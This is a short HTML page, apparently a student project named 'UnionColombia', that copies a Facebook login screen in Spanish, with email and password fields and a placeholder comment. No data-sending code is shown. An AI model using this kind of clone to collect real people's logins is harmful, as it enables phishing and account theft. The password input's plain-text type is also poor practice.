<!DOCTYPE html>
<html>


<head>
  <title>UnionColombia proyecto</title>
  <link rel="stylesheet" type="text/css" href="style.css"> 
</head>


<body>
  <div class="container">
    <h1>Iniciar sesión en Facebook</h1>
    <form id="login-form">


      <label for="email">Correo electrónico o número de teléfono:</label>
      <input type="text" id="email" name="email" required>

      <label for="password">Contraseña</label>
      <input type="text" id="contraseña" name="password" required>
      <!-- Añade tu código aquí para crear un campo de contraseña -->
      

      <button type="submit" id="login-button">Iniciar sesión</button>
      <button type="submit" id="Forget-password">¿Has olvidado la contraseña?</button>


    </form>
  </div>

  <script src="script.js"></script>
</body>
</html>
